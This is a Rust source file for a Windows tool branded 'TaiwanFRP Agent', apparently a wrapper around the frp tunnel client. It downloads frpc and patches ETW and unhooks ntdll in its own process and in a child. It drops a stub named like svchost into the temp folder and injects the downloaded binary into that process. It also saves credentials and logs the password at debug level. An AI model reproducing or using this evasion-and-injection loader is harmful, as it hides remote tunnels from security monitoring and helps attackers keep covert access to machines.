mod credentials;
mod i18n;
mod language;

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod downloader;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod evasion;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod injector;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod syscall;

use clap::Parser;
use colored::Colorize;
use std::io::{self, Write};

use log::{debug, error, info, warn};

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use std::env;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use std::ffi::OsStr;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use std::fs;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use std::os::windows::ffi::OsStrExt;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use std::ptr;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use windows_sys::Win32::Foundation::FALSE;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
use windows_sys::Win32::System::Threading::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};

#[derive(Parser)]
#[command(version)]
#[command(before_help = "TaiwanFRP Agent", about)]
struct Cli {
    /// Show the system language
    #[arg(long)]
    lang: bool,
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
fn to_wchar(str: &str) -> Vec<u16> {
    OsStr::new(str)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn main() {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
        .format(|buf, record| {
            use log::Level;
            use std::io::Write;
            let level = match record.level() {
                Level::Error => record.level().to_string().red().to_string(),
                Level::Warn => record.level().to_string().yellow().to_string(),
                Level::Info => record.level().to_string().green().to_string(),
                Level::Debug => record.level().to_string().blue().to_string(),
                Level::Trace => record.level().to_string().dimmed().to_string(),
            };
            writeln!(buf, "[{} {}] {}", buf.timestamp(), level, record.args())
        })
        .init();
    let cli = Cli::parse();

    let language = language::get_system_locale();

    if cli.lang {
        info!("{}", language);
        return;
    }

    let i18n = i18n::load_language(&language);

    info!("{}", i18n.get("welcome"));

    match credentials::load_credentials() {
        Ok((username, password)) => {
            info!("{}", i18n.get("auth.credentials_found"));
            info!("{}{}", i18n.get("auth.username"), username);
            debug!("{}{}", i18n.get("auth.password"), password);
        }

        Err(_) => {
            warn!("{}", i18n.get("auth.credentials_not_found").yellow());

            print!("{}", i18n.get("auth.username"));
            io::stdout().flush().unwrap();

            let mut username = String::new();
            io::stdin().read_line(&mut username).unwrap();
            let username = username.trim();

            print!("{}", i18n.get("auth.password"));
            io::stdout().flush().unwrap();

            let password = rpassword::read_password().unwrap();

            credentials::save_credentials(username, &password).expect("Failed to save credentials");
            info!("{}", i18n.get("auth.credentials_saved"));
        }
    }

    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
    {
        // 下載並解壓 frpc.exe
        let frpc_buffer = match downloader::fetch_frpc() {
            Some(b) => b,
            None => return,
        };

        // ETW patch + API unhooking
        unsafe {
            evasion::patch_etw_self();
            evasion::unhook_ntdll();
        }

        // 啟動 stub.exe
        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        let stub_path = env::temp_dir().join(format!("svchost_{}.exe", std::process::id()));
        fs::write(&stub_path, injector::STUB_EXE).expect("Failed to write stub.exe");
        debug!("stub.exe 寫至: {}", stub_path.display());
        let stub_path_str = stub_path.to_str().unwrap();
        let config_path = r"frpc.ini";
        let full_command_line = format!("{} -c \"{}\"", stub_path_str, config_path);
        let mut cmd_w = to_wchar(&full_command_line);

        let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        info!("Starting frpc...");
        debug!("Command line: {}", full_command_line);

        let success = unsafe {
            CreateProcessW(
                ptr::null(),
                cmd_w.as_mut_ptr(),
                ptr::null(),
                ptr::null(),
                FALSE,
                0, // 正常啟動
                ptr::null(),
                ptr::null(),
                &si,
                &mut pi,
            )
        };

        if success == FALSE {
            error!(
                "Failed to start process! Error code: {}",
                std::io::Error::last_os_error()
            );
            return;
        }

        debug!("Successfully started stub.exe!");
        debug!("Process ID (PID): {}", pi.dwProcessId);
        debug!("Thread ID (TID): {}", pi.dwThreadId);
        debug!("Process Handle: 0x{:x}", pi.hProcess as usize);

        unsafe {
            evasion::patch_etw_remote(pi.hProcess);
            evasion::unhook_ntdll_remote(pi.hProcess);
        }

        let stub_path_clone = stub_path.clone();
        ctrlc::set_handler(move || {
            info!("正在關閉 TaiwanFRP...");
            let _ = fs::remove_file(&stub_path_clone);
            debug!("stub.exe 已刪除");
            std::process::exit(0);
        })
        .expect("Failed to set Ctrl+C handler");

        unsafe {
            injector::inject_and_run(pi.hProcess, pi.hThread, &frpc_buffer);
        }

        let _ = fs::remove_file(&stub_path);
        debug!("stub.exe 已刪除");
    }

    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
    {
        info!("此平台尚未支援，目前僅支援 Windows x86_64");
    }
}
